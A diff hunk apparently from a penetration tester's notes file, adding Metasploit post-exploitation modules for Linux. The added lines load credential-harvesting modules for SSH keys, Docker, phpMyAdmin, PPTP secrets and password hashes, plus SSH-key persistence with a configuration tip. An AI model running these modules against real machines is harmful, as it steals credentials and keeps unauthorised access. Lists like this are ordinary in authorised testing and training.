@@ -25,6 +25,16 @@ post/linux/gather/checkvm
 post/linux/gather/enum_users_history
 post/multi/manage/system_session
 post/linux/manage/download_exec
+use post/multi/gather/ssh_creds
+use post/multi/gather/docker_creds
+use post/linux/gather/ecryptfs_creds
+use post/linux/gather/enum_psk
+use post/linux/gather/enum_xchat
+use post/linux/gather/phpmyadmin_credsteal
+use post/linux/gather/pptpd_chap_secrets
+use post/linux/manage/sshkey_persistence
+**** post/linux/gather/hashdump // needs meterpreter shell with root
+*** use post/linux/manage/sshkey_persistence //set CREATESSHFOLDER true
 
 
 UAC BYPASS -
